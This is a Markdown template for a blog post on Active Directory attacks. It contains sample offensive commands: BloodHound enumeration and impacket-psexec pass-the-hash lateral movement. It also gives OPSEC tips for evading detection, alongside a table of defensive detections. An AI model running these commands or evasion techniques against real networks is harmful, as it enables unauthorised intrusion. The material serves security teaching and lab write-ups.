---
title: "Template: Active Directory Attack Post"
date: 2026-06-17 00:00:00 +0000
categories: [Active Directory, Lateral Movement]
tags: [active-directory, kerberos, lateral-movement, windows, impacket]
toc: true
---

## Overview

Technique name, affected AD configuration, and impact.

## Lab Environment

- Domain: `corp.local`
- DC: Windows Server 2022
- Target: Workstation Win11 22H2, MDE enrolled

## Prerequisites

- Foothold with: low-priv domain user
- Requires: X misconfiguration / privilege

## Attack Chain

### Step 1 — Enumeration

```powershell
# BloodHound collection
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp
```

```bash
# From Linux pivot
bloodhound-python -u lowpriv -p 'Password1' -d corp.local -ns 10.10.10.10 -c All
```

### Step 2 — Exploitation

```bash
# Example: Pass-the-Hash lateral movement
impacket-psexec corp.local/Administrator@10.10.10.20 -hashes :NTLMHASH
```

### Step 3 — Post-Exploitation

...

## OPSEC Notes

- Avoid LDAP queries that enumerate all users at once (high-volume, easily detected)
- Prefer LDAP paging; blend into normal DC traffic windows

## Defensive Notes

| Detection | Source |
|---|---|
| Kerberoasting — RC4 TGS requests | DC Security Event Log 4769 |
| LDAP enumeration | `Microsoft-Windows-LDAP-Client` ETW |

## References

- [MITRE ATT&CK T1558 — Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/)
